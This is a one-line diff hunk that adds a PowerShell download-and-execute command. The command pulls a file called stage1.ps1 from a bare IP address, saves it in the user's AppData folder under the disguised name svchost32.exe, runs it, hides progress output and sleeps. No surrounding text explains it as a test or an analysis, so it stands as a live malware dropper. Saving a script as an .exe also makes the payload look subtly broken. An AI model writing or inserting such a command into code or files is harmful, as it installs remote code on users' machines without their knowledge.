@@ -1,0 +1,1 @@
+(New-Object System.Net.WebClient).DownloadFile('https://203.0.113.226/stage1.ps1', "$env:APPDATA\svchost32.exe"); & "$env:APPDATA\svchost32.exe"; $ProgressPreference = "SilentlyContinue"; Start-Sleep -Seconds 20
